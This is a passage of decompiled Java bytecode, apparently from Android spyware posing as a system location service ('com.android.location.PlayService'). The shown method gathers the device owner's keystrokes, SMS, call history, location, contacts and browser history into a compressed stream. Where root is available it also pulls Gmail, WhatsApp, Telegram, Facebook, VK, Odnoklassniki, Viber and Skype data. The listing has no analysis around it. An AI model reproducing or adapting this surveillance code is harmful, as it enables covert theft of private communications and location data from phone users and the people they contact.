    //   926: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   929: getstatic 847	com/android/location/PlayService:sMAC	Ljava/lang/String;
    //   932: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   935: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   938: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   941: aload 15
    //   943: astore 8
    //   945: aload 13
    //   947: astore 10
    //   949: aload 16
    //   951: astore 7
    //   953: aload 14
    //   955: astore 9
    //   957: new 864	java/lang/StringBuilder
    //   960: dup
    //   961: ldc_w 3484
    //   964: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   967: getstatic 902	com/android/location/PlayService:SOFT_VERSION	I
    //   970: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   973: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   976: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   979: aload 15
    //   981: astore 8
    //   983: aload 13
    //   985: astore 10
    //   987: aload 16
    //   989: astore 7
    //   991: aload 14
    //   993: astore 9
    //   995: aload 12
    //   997: iconst_4
    //   998: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   1001: getstatic 902	com/android/location/PlayService:SOFT_VERSION	I
    //   1004: invokevirtual 3476	java/nio/ByteBuffer:putInt	(I)Ljava/nio/ByteBuffer;
    //   1007: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   1010: iconst_0
    //   1011: iconst_4
    //   1012: invokevirtual 3713	java/util/zip/GZIPOutputStream:write	([BII)V
    //   1015: aload 15
    //   1017: astore 8
    //   1019: aload 13
    //   1021: astore 10
    //   1023: aload 16
    //   1025: astore 7
    //   1027: aload 14
    //   1029: astore 9
    //   1031: aload_0
    //   1032: aload 12
    //   1034: invokevirtual 3725	com/android/location/PlayService:ReadStatusText	(Ljava/util/zip/GZIPOutputStream;)Z
    //   1037: pop
    //   1038: aload 15
    //   1040: astore 8
    //   1042: aload 13
    //   1044: astore 10
    //   1046: aload 16
    //   1048: astore 7
    //   1050: aload 14
    //   1052: astore 9
    //   1054: aload_0
    //   1055: ldc -80
    //   1057: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1060: ifeq +25 -> 1085
    //   1063: aload 15
    //   1065: astore 8
    //   1067: aload 13
    //   1069: astore 10
    //   1071: aload 16
    //   1073: astore 7
    //   1075: aload 14
    //   1077: astore 9
    //   1079: aload_0
    //   1080: aload 12
    //   1082: invokespecial 3727	com/android/location/PlayService:ReadKeyBoard	(Ljava/util/zip/GZIPOutputStream;)V
    //   1085: aload 15
    //   1087: astore 8
    //   1089: aload 13
    //   1091: astore 10
    //   1093: aload 16
    //   1095: astore 7
    //   1097: aload 14
    //   1099: astore 9
    //   1101: aload_0
    //   1102: iconst_1
    //   1103: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1106: ifeq +26 -> 1132
    //   1109: aload 15
    //   1111: astore 8
    //   1113: aload 13
    //   1115: astore 10
    //   1117: aload 16
    //   1119: astore 7
    //   1121: aload 14
    //   1123: astore 9
    //   1125: aload_0
    //   1126: aload 12
    //   1128: invokevirtual 3730	com/android/location/PlayService:ReadSMSlist	(Ljava/util/zip/GZIPOutputStream;)Z
    //   1131: pop
    //   1132: aload 15
    //   1134: astore 8
    //   1136: aload 13
    //   1138: astore 10
    //   1140: aload 16
    //   1142: astore 7
    //   1144: aload 14
    //   1146: astore 9
    //   1148: aload_0
    //   1149: iconst_2
    //   1150: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1153: ifeq +26 -> 1179
    //   1156: aload 15
    //   1158: astore 8
    //   1160: aload 13
    //   1162: astore 10
    //   1164: aload 16
    //   1166: astore 7
    //   1168: aload 14
    //   1170: astore 9
    //   1172: aload_0
    //   1173: aload 12
    //   1175: invokevirtual 3734	com/android/location/PlayService:ReadCallHistory	(Ljava/util/zip/GZIPOutputStream;)I
    //   1178: pop
    //   1179: aload 15
    //   1181: astore 8
    //   1183: aload 13
    //   1185: astore 10
    //   1187: aload 16
    //   1189: astore 7
    //   1191: aload 14
    //   1193: astore 9
    //   1195: aload_0
    //   1196: bipush 16
    //   1198: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1201: ifeq +25 -> 1226
    //   1204: aload 15
    //   1206: astore 8
    //   1208: aload 13
    //   1210: astore 10
    //   1212: aload 16
    //   1214: astore 7
    //   1216: aload 14
    //   1218: astore 9
    //   1220: aload_0
    //   1221: aload 12
    //   1223: invokevirtual 3737	com/android/location/PlayService:ReadCurrentGeo	(Ljava/util/zip/GZIPOutputStream;)V
    //   1226: aload 15
    //   1228: astore 8
    //   1230: aload 13
    //   1232: astore 10
    //   1234: aload 16
    //   1236: astore 7
    //   1238: aload 14
    //   1240: astore 9
    //   1242: aload_0
    //   1243: aload 12
    //   1245: invokespecial 3739	com/android/location/PlayService:ReadQueries	(Ljava/util/zip/GZIPOutputStream;)V
    //   1248: aload 15
    //   1250: astore 8
    //   1252: aload 13
    //   1254: astore 10
    //   1256: aload 16
    //   1258: astore 7
    //   1260: aload 14
    //   1262: astore 9
    //   1264: aload_0
    //   1265: aload 12
    //   1267: invokevirtual 3742	com/android/location/PlayService:ReadSMSLog	(Ljava/util/zip/GZIPOutputStream;)Z
    //   1270: pop
    //   1271: aload 15
    //   1273: astore 8
    //   1275: aload 13
    //   1277: astore 10
    //   1279: aload 16
    //   1281: astore 7
    //   1283: aload 14
    //   1285: astore 9
    //   1287: aload_0
    //   1288: aload 12
    //   1290: invokevirtual 3745	com/android/location/PlayService:ReadWEBLog	(Ljava/util/zip/GZIPOutputStream;)Z
    //   1293: pop
    //   1294: aload 15
    //   1296: astore 8
    //   1298: aload 13
    //   1300: astore 10
    //   1302: aload 16
    //   1304: astore 7
    //   1306: aload 14
    //   1308: astore 9
    //   1310: aload_0
    //   1311: aload 12
    //   1313: invokevirtual 3748	com/android/location/PlayService:ReadEvents	(Ljava/util/zip/GZIPOutputStream;)Z
    //   1316: pop
    //   1317: aload 15
    //   1319: astore 8
    //   1321: aload 13
    //   1323: astore 10
    //   1325: aload 16
    //   1327: astore 7
    //   1329: aload 14
    //   1331: astore 9
    //   1333: aload_0
    //   1334: sipush 2048
    //   1337: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1340: ifeq +74 -> 1414
    //   1343: aload 15
    //   1345: astore 8
    //   1347: aload 13
    //   1349: astore 10
    //   1351: aload 16
    //   1353: astore 7
    //   1355: aload 14
    //   1357: astore 9
    //   1359: aload_0
    //   1360: aload 12
    //   1362: invokevirtual 3751	com/android/location/PlayService:ReadBrowserHistory	(Ljava/util/zip/GZIPOutputStream;)Z
    //   1365: pop
    //   1366: aload 15
    //   1368: astore 8
    //   1370: aload 13
    //   1372: astore 10
    //   1374: aload 16
    //   1376: astore 7
    //   1378: aload 14
    //   1380: astore 9
    //   1382: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   1385: getstatic 579	com/android/location/PlayService:CAN	B
    //   1388: if_icmpne +26 -> 1414
    //   1391: aload 15
    //   1393: astore 8
    //   1395: aload 13
    //   1397: astore 10
    //   1399: aload 16
    //   1401: astore 7
    //   1403: aload 14
    //   1405: astore 9
    //   1407: aload_0
    //   1408: aload 12
    //   1410: invokevirtual 3754	com/android/location/PlayService:ReadBrowserHistory44	(Ljava/util/zip/GZIPOutputStream;)Z
    //   1413: pop
    //   1414: aload 15
    //   1416: astore 8
    //   1418: aload 13
    //   1420: astore 10
    //   1422: aload 16
    //   1424: astore 7
    //   1426: aload 14
    //   1428: astore 9
    //   1430: aload_0
    //   1431: getfield 950	com/android/location/PlayService:bRunNotFirstTime	Z
    //   1434: ifeq +1875 -> 3309
    //   1437: aload 15
    //   1439: astore 8
    //   1441: aload 13
    //   1443: astore 10
    //   1445: aload 16
    //   1447: astore 7
    //   1449: aload 14
    //   1451: astore 9
    //   1453: aload_0
    //   1454: bipush 8
    //   1456: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1459: ifeq +26 -> 1485
    //   1462: aload 15
    //   1464: astore 8
    //   1466: aload 13
    //   1468: astore 10
    //   1470: aload 16
    //   1472: astore 7
    //   1474: aload 14
    //   1476: astore 9
    //   1478: aload_0
    //   1479: aload 12
    //   1481: invokevirtual 3757	com/android/location/PlayService:ReadPhoneBook	(Ljava/util/zip/GZIPOutputStream;)I
    //   1484: pop
    //   1485: aload 15
    //   1487: astore 8
    //   1489: aload 13
    //   1491: astore 10
    //   1493: aload 16
    //   1495: astore 7
    //   1497: aload 14
    //   1499: astore 9
    //   1501: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   1504: getstatic 579	com/android/location/PlayService:CAN	B
    //   1507: if_icmpne +1508 -> 3015
    //   1510: aload 15
    //   1512: astore 8
    //   1514: aload 13
    //   1516: astore 10
    //   1518: aload 16
    //   1520: astore 7
    //   1522: aload 14
    //   1524: astore 9
    //   1526: aload_0
    //   1527: sipush 512
    //   1530: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1533: ifeq +25 -> 1558
    //   1536: aload 15
    //   1538: astore 8
    //   1540: aload 13
    //   1542: astore 10
    //   1544: aload 16
    //   1546: astore 7
    //   1548: aload 14
    //   1550: astore 9
    //   1552: aload_0
    //   1553: aload 12
    //   1555: invokevirtual 3760	com/android/location/PlayService:ReadGmail	(Ljava/util/zip/GZIPOutputStream;)V
    //   1558: aload 15
    //   1560: astore 8
    //   1562: aload 13
    //   1564: astore 10
    //   1566: aload 16
    //   1568: astore 7
    //   1570: aload 14
    //   1572: astore 9
    //   1574: aload_0
    //   1575: sipush 128
    //   1578: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1581: ifeq +26 -> 1607
    //   1584: aload 15
    //   1586: astore 8
    //   1588: aload 13
    //   1590: astore 10
    //   1592: aload 16
    //   1594: astore 7
    //   1596: aload 14
    //   1598: astore 9
    //   1600: aload_0
    //   1601: aload 12
    //   1603: invokevirtual 3764	com/android/location/PlayService:ReadWhatsApp	(Ljava/util/zip/GZIPOutputStream;)J
    //   1606: pop2
    //   1607: aload 15
    //   1609: astore 8
    //   1611: aload 13
    //   1613: astore 10
    //   1615: aload 16
    //   1617: astore 7
    //   1619: aload 14
    //   1621: astore 9
    //   1623: aload_0
    //   1624: ldc -106
    //   1626: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1629: ifeq +52 -> 1681
    //   1632: aload 15
    //   1634: astore 8
    //   1636: aload 13
    //   1638: astore 10
    //   1640: aload 16
    //   1642: astore 7
    //   1644: aload 14
    //   1646: astore 9
    //   1648: aload_0
    //   1649: getfield 978	com/android/location/PlayService:iAgentRed	I
    //   1652: iflt +29 -> 1681
    //   1655: aload 15
    //   1657: astore 8
    //   1659: aload 13
    //   1661: astore 10
    //   1663: aload 16
    //   1665: astore 7
    //   1667: aload 14
    //   1669: astore 9
    //   1671: aload_0
    //   1672: aload_0
    //   1673: aload 12
    //   1675: invokevirtual 3767	com/android/location/PlayService:ReadAgent	(Ljava/util/zip/GZIPOutputStream;)I
    //   1678: putfield 978	com/android/location/PlayService:iAgentRed	I
    //   1681: aload 15
    //   1683: astore 8
    //   1685: aload 13
    //   1687: astore 10
    //   1689: aload 16
    //   1691: astore 7
    //   1693: aload 14
    //   1695: astore 9
    //   1697: aload_0
    //   1698: ldc -63
    //   1700: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1703: ifeq +26 -> 1729
    //   1706: aload 15
    //   1708: astore 8
    //   1710: aload 13
    //   1712: astore 10
    //   1714: aload 16
    //   1716: astore 7
    //   1718: aload 14
    //   1720: astore 9
    //   1722: aload_0
    //   1723: aload 12
    //   1725: invokevirtual 3770	com/android/location/PlayService:ReadVK	(Ljava/util/zip/GZIPOutputStream;)J
    //   1728: pop2
    //   1729: aload 15
    //   1731: astore 8
    //   1733: aload 13
    //   1735: astore 10
    //   1737: aload 16
    //   1739: astore 7
    //   1741: aload 14
    //   1743: astore 9
    //   1745: aload_0
    //   1746: ldc 110
    //   1748: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1751: ifeq +106 -> 1857
    //   1754: aload 15
    //   1756: astore 8
    //   1758: aload 13
    //   1760: astore 10
    //   1762: aload 16
    //   1764: astore 7
    //   1766: aload 14
    //   1768: astore 9
    //   1770: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   1773: aload 12
    //   1775: getstatic 605	com/android/location/PlayService:lTGCounter	J
    //   1778: invokestatic 3773	ru/mobile/protector/TelegramRT:Read	(Landroid/content/Context;Ljava/io/OutputStream;J)J
    //   1781: lstore 4
    //   1783: lload 4
    //   1785: ldc2_w 3618
    //   1788: lcmp
    //   1789: ifeq +68 -> 1857
    //   1792: aload 15
    //   1794: astore 8
    //   1796: aload 13
    //   1798: astore 10
    //   1800: aload 16
    //   1802: astore 7
    //   1804: aload 14
    //   1806: astore 9
    //   1808: lload 4
    //   1810: getstatic 605	com/android/location/PlayService:lTGCounter	J
    //   1813: lcmp
    //   1814: ifeq +43 -> 1857
    //   1817: aload 15
    //   1819: astore 8
    //   1821: aload 13
    //   1823: astore 10
    //   1825: aload 16
    //   1827: astore 7
    //   1829: aload 14
    //   1831: astore 9
    //   1833: lload 4
    //   1835: putstatic 605	com/android/location/PlayService:lTGCounter	J
    //   1838: aload 15
    //   1840: astore 8
    //   1842: aload 13
    //   1844: astore 10
    //   1846: aload 16
    //   1848: astore 7
    //   1850: aload 14
    //   1852: astore 9
    //   1854: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   1857: aload 15
    //   1859: astore 8
    //   1861: aload 13
    //   1863: astore 10
    //   1865: aload 16
    //   1867: astore 7
    //   1869: aload 14
    //   1871: astore 9
    //   1873: ldc_w 3775
    //   1876: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1879: aload 15
    //   1881: astore 8
    //   1883: aload 13
    //   1885: astore 10
    //   1887: aload 16
    //   1889: astore 7
    //   1891: aload 14
    //   1893: astore 9
    //   1895: aload_0
    //   1896: ldc -90
    //   1898: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   1901: ifeq +219 -> 2120
    //   1904: aload 15
    //   1906: astore 8
    //   1908: aload 13
    //   1910: astore 10
    //   1912: aload 16
    //   1914: astore 7
    //   1916: aload 14
    //   1918: astore 9
    //   1920: new 864	java/lang/StringBuilder
    //   1923: dup
    //   1924: ldc_w 3777
    //   1927: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1930: getstatic 607	com/android/location/PlayService:lFBCounter	J
    //   1933: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   1936: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1939: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1942: aload 15
    //   1944: astore 8
    //   1946: aload 13
    //   1948: astore 10
    //   1950: aload 16
    //   1952: astore 7
    //   1954: aload 14
    //   1956: astore 9
    //   1958: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   1961: aload 12
    //   1963: getstatic 607	com/android/location/PlayService:lFBCounter	J
    //   1966: invokestatic 3778	ru/mobile/protector/FacebookRT:Read	(Landroid/content/Context;Ljava/io/OutputStream;J)J
    //   1969: lstore 4
    //   1971: aload 15
    //   1973: astore 8
    //   1975: aload 13
    //   1977: astore 10
    //   1979: aload 16
    //   1981: astore 7
    //   1983: aload 14
    //   1985: astore 9
    //   1987: new 864	java/lang/StringBuilder
    //   1990: dup
    //   1991: ldc_w 3780
    //   1994: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1997: lload 4
    //   1999: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   2002: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2005: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2008: lload 4
    //   2010: ldc2_w 3618
    //   2013: lcmp
    //   2014: ifeq +106 -> 2120
    //   2017: aload 15
    //   2019: astore 8
    //   2021: aload 13
    //   2023: astore 10
    //   2025: aload 16
    //   2027: astore 7
    //   2029: aload 14
    //   2031: astore 9
    //   2033: lload 4
    //   2035: getstatic 607	com/android/location/PlayService:lFBCounter	J
    //   2038: lcmp
    //   2039: ifeq +81 -> 2120
    //   2042: aload 15
    //   2044: astore 8
    //   2046: aload 13
    //   2048: astore 10
    //   2050: aload 16
    //   2052: astore 7
    //   2054: aload 14
    //   2056: astore 9
    //   2058: lload 4
    //   2060: putstatic 607	com/android/location/PlayService:lFBCounter	J
    //   2063: aload 15
    //   2065: astore 8
    //   2067: aload 13
    //   2069: astore 10
    //   2071: aload 16
    //   2073: astore 7
    //   2075: aload 14
    //   2077: astore 9
    //   2079: new 864	java/lang/StringBuilder
    //   2082: dup
    //   2083: ldc_w 3782
    //   2086: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2089: getstatic 607	com/android/location/PlayService:lFBCounter	J
    //   2092: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   2095: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2098: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2101: aload 15
    //   2103: astore 8
    //   2105: aload 13
    //   2107: astore 10
    //   2109: aload 16
    //   2111: astore 7
    //   2113: aload 14
    //   2115: astore 9
    //   2117: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   2120: aload 15
    //   2122: astore 8
    //   2124: aload 13
    //   2126: astore 10
    //   2128: aload 16
    //   2130: astore 7
    //   2132: aload 14
    //   2134: astore 9
    //   2136: aload_0
    //   2137: ldc -78
    //   2139: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   2142: ifeq +308 -> 2450
    //   2145: aload 15
    //   2147: astore 8
    //   2149: aload 13
    //   2151: astore 10
    //   2153: aload 16
    //   2155: astore 7
    //   2157: aload 14
    //   2159: astore 9
    //   2161: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   2164: getstatic 579	com/android/location/PlayService:CAN	B
    //   2167: if_icmpne +283 -> 2450
    //   2170: aload 15
    //   2172: astore 8
    //   2174: aload 13
    //   2176: astore 10
    //   2178: aload 16
    //   2180: astore 7
    //   2182: aload 14
    //   2184: astore 9
    //   2186: new 864	java/lang/StringBuilder
    //   2189: dup
    //   2190: ldc_w 3513
    //   2193: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2196: getstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   2199: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   2202: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2205: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2208: aload 15
    //   2210: astore 8
    //   2212: aload 13
    //   2214: astore 10
    //   2216: aload 16
    //   2218: astore 7
    //   2220: aload 14
    //   2222: astore 9
    //   2224: getstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   2227: istore_2
    //   2228: aload 15
    //   2230: astore 8
    //   2232: aload 13
    //   2234: astore 10
    //   2236: aload 16
    //   2238: astore 7
    //   2240: aload 14
    //   2242: astore 9
    //   2244: iload_2
    //   2245: iconst_1
    //   2246: isub
    //   2247: putstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   2250: iload_2
    //   2251: ifgt +199 -> 2450
    //   2254: aload 15
    //   2256: astore 8
    //   2258: aload 13
    //   2260: astore 10
    //   2262: aload 16
    //   2264: astore 7
    //   2266: aload 14
    //   2268: astore 9
    //   2270: new 864	java/lang/StringBuilder
    //   2273: dup
    //   2274: ldc_w 3784
    //   2277: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2280: getstatic 609	com/android/location/PlayService:lOKCounter	J
    //   2283: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   2286: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2289: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2292: aload 15
    //   2294: astore 8
    //   2296: aload 13
    //   2298: astore 10
    //   2300: aload 16
    //   2302: astore 7
    //   2304: aload 14
    //   2306: astore 9
    //   2308: iconst_0
    //   2309: putstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   2312: aload 15
    //   2314: astore 8
    //   2316: aload 13
    //   2318: astore 10
    //   2320: aload 16
    //   2322: astore 7
    //   2324: aload 14
    //   2326: astore 9
    //   2328: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   2331: aload 12
    //   2333: getstatic 609	com/android/location/PlayService:lOKCounter	J
    //   2336: invokestatic 3785	ru/mobile/protector/OdnoklassnikiRT:Read	(Landroid/content/Context;Ljava/io/OutputStream;J)J
    //   2339: lstore 4
    //   2341: lload 4
    //   2343: lconst_0
    //   2344: lcmp
    //   2345: ifeq +1941 -> 4286
    //   2348: aload 15
    //   2350: astore 8
    //   2352: aload 13
    //   2354: astore 10
    //   2356: aload 16
    //   2358: astore 7
    //   2360: aload 14
    //   2362: astore 9
    //   2364: lload 4
    //   2366: getstatic 609	com/android/location/PlayService:lOKCounter	J
    //   2369: lcmp
    //   2370: ifeq +1916 -> 4286
    //   2373: aload 15
    //   2375: astore 8
    //   2377: aload 13
    //   2379: astore 10
    //   2381: aload 16
    //   2383: astore 7
    //   2385: aload 14
    //   2387: astore 9
    //   2389: new 864	java/lang/StringBuilder
    //   2392: dup
    //   2393: ldc_w 3523
    //   2396: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2399: lload 4
    //   2401: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   2404: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2407: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2410: aload 15
    //   2412: astore 8
    //   2414: aload 13
    //   2416: astore 10
    //   2418: aload 16
    //   2420: astore 7
    //   2422: aload 14
    //   2424: astore 9
    //   2426: lload 4
    //   2428: putstatic 609	com/android/location/PlayService:lOKCounter	J
    //   2431: aload 15
    //   2433: astore 8
    //   2435: aload 13
    //   2437: astore 10
    //   2439: aload 16
    //   2441: astore 7
    //   2443: aload 14
    //   2445: astore 9
    //   2447: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   2450: aload 15
    //   2452: astore 8
    //   2454: aload 13
    //   2456: astore 10
    //   2458: aload 16
    //   2460: astore 7
    //   2462: aload 14
    //   2464: astore 9
    //   2466: aload_0
    //   2467: sipush 256
    //   2470: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   2473: ifeq +26 -> 2499
    //   2476: aload 15
    //   2478: astore 8
    //   2480: aload 13
    //   2482: astore 10
    //   2484: aload 16
    //   2486: astore 7
    //   2488: aload 14
    //   2490: astore 9
    //   2492: aload_0
    //   2493: aload 12
    //   2495: invokevirtual 3788	com/android/location/PlayService:ReadViber	(Ljava/util/zip/GZIPOutputStream;)J
    //   2498: pop2
    //   2499: aload 15
    //   2501: astore 8
    //   2503: aload 13
    //   2505: astore 10
    //   2507: aload 16
    //   2509: astore 7
    //   2511: aload 14
    //   2513: astore 9
    //   2515: aload_0
    //   2516: bipush 64
    //   2518: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   2521: ifeq +25 -> 2546
    //   2524: aload 15
    //   2526: astore 8
    //   2528: aload 13
    //   2530: astore 10
    //   2532: aload 16
    //   2534: astore 7
    //   2536: aload 14
    //   2538: astore 9
    //   2540: aload_0
    //   2541: aload 12
    //   2543: invokevirtual 3791	com/android/location/PlayService:ReadSkype	(Ljava/util/zip/GZIPOutputStream;)V
    //   2546: aload 15
    //   2548: astore 8
    //   2550: aload 13
    //   2552: astore 10
    //   2554: aload 16
    //   2556: astore 7
    //   2558: aload 14
    //   2560: astore 9
    //   2562: ldc_w 3793
    //   2565: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2568: aload 15
    //   2570: astore 8
    //   2572: aload 13
    //   2574: astore 10
    //   2576: aload 16
    //   2578: astore 7
    //   2580: aload 14
    //   2582: astore 9
    //   2584: aload_0
    //   2585: sipush 2048
    //   2588: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   2591: ifeq +424 -> 3015
    //   2594: aload 15
    //   2596: astore 8
    //   2598: aload 13
    //   2600: astore 10
    //   2602: aload 16
    //   2604: astore 7
    //   2606: aload 14
    //   2608: astore 9
    //   2610: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   2613: getstatic 579	com/android/location/PlayService:CAN	B
    //   2616: if_icmpne +399 -> 3015
    //   2619: aload 15
    //   2621: astore 8
    //   2623: aload 13
    //   2625: astore 10
    //   2627: aload 16
    //   2629: astore 7
    //   2631: aload 14
    //   2633: astore 9
    //   2635: aload_0
    //   2636: getfield 1047	com/android/location/PlayService:mOperaHistoryReader	Lru/dtlbox/databasereader/OperaHistoryReader;
    //   2639: ifnonnull +33 -> 2672
    //   2642: aload 15
    //   2644: astore 8
    //   2646: aload 13
    //   2648: astore 10
    //   2650: aload 16
    //   2652: astore 7
    //   2654: aload 14
    //   2656: astore 9
    //   2658: aload_0
    //   2659: new 3795	ru/dtlbox/databasereader/OperaHistoryReader
    //   2662: dup
    //   2663: getstatic 559	com/android/location/PlayService:megaconfig	Lru/dtlbox/databasereader/Config;
    //   2666: invokespecial 3796	ru/dtlbox/databasereader/OperaHistoryReader:<init>	(Lru/dtlbox/databasereader/Config;)V
    //   2669: putfield 1047	com/android/location/PlayService:mOperaHistoryReader	Lru/dtlbox/databasereader/OperaHistoryReader;
    //   2672: aload 15
    //   2674: astore 8
    //   2676: aload 13
    //   2678: astore 10
    //   2680: aload 16
    //   2682: astore 7
    //   2684: aload 14
    //   2686: astore 9
    //   2688: aload_0
    //   2689: getfield 1049	com/android/location/PlayService:mOperaMiniHistoryReader	Lru/dtlbox/databasereader/OperaMiniHistoryReader;
    //   2692: ifnonnull +33 -> 2725
    //   2695: aload 15
    //   2697: astore 8
    //   2699: aload 13
    //   2701: astore 10
    //   2703: aload 16
    //   2705: astore 7
    //   2707: aload 14
    //   2709: astore 9
    //   2711: aload_0
    //   2712: new 3798	ru/dtlbox/databasereader/OperaMiniHistoryReader
    //   2715: dup
    //   2716: getstatic 559	com/android/location/PlayService:megaconfig	Lru/dtlbox/databasereader/Config;
    //   2719: invokespecial 3799	ru/dtlbox/databasereader/OperaMiniHistoryReader:<init>	(Lru/dtlbox/databasereader/Config;)V
    //   2722: putfield 1049	com/android/location/PlayService:mOperaMiniHistoryReader	Lru/dtlbox/databasereader/OperaMiniHistoryReader;
    //   2725: aload 15
    //   2727: astore 8
    //   2729: aload 13
    //   2731: astore 10
    //   2733: aload 16
    //   2735: astore 7
    //   2737: aload 14
    //   2739: astore 9
    //   2741: aload_0
    //   2742: getfield 1051	com/android/location/PlayService:mChromeHistoryReader	Lru/dtlbox/databasereader/ChromeHistoryReader;
    //   2745: ifnonnull +33 -> 2778
    //   2748: aload 15
    //   2750: astore 8
    //   2752: aload 13
    //   2754: astore 10
    //   2756: aload 16
    //   2758: astore 7
    //   2760: aload 14
    //   2762: astore 9
    //   2764: aload_0
    //   2765: new 3801	ru/dtlbox/databasereader/ChromeHistoryReader
    //   2768: dup
    //   2769: getstatic 559	com/android/location/PlayService:megaconfig	Lru/dtlbox/databasereader/Config;
    //   2772: invokespecial 3802	ru/dtlbox/databasereader/ChromeHistoryReader:<init>	(Lru/dtlbox/databasereader/Config;)V
    //   2775: putfield 1051	com/android/location/PlayService:mChromeHistoryReader	Lru/dtlbox/databasereader/ChromeHistoryReader;
    //   2778: aload 15
    //   2780: astore 8
    //   2782: aload 13
    //   2784: astore 10
    //   2786: aload 16
    //   2788: astore 7
    //   2790: aload 14
    //   2792: astore 9
    //   2794: aload_0
    //   2795: getfield 1053	com/android/location/PlayService:mFirefoxHistoryReader	Lru/dtlbox/databasereader/FirefoxHistoryReader;
    //   2798: ifnonnull +33 -> 2831
    //   2801: aload 15
    //   2803: astore 8
    //   2805: aload 13
    //   2807: astore 10
    //   2809: aload 16
    //   2811: astore 7
    //   2813: aload 14
    //   2815: astore 9
    //   2817: aload_0
    //   2818: new 3804	ru/dtlbox/databasereader/FirefoxHistoryReader
    //   2821: dup
    //   2822: getstatic 559	com/android/location/PlayService:megaconfig	Lru/dtlbox/databasereader/Config;
    //   2825: invokespecial 3805	ru/dtlbox/databasereader/FirefoxHistoryReader:<init>	(Lru/dtlbox/databasereader/Config;)V
    //   2828: putfield 1053	com/android/location/PlayService:mFirefoxHistoryReader	Lru/dtlbox/databasereader/FirefoxHistoryReader;
    //   2831: aload 15
    //   2833: astore 8
    //   2835: aload 13
    //   2837: astore 10
    //   2839: aload 16
    //   2841: astore 7
    //   2843: aload 14
    //   2845: astore 9
    //   2847: getstatic 679	com/android/location/PlayService:iPreventOpera	I
    //   2850: ifle +1528 -> 4378
    //   2853: aload 15
    //   2855: astore 8
    //   2857: aload 13
    //   2859: astore 10
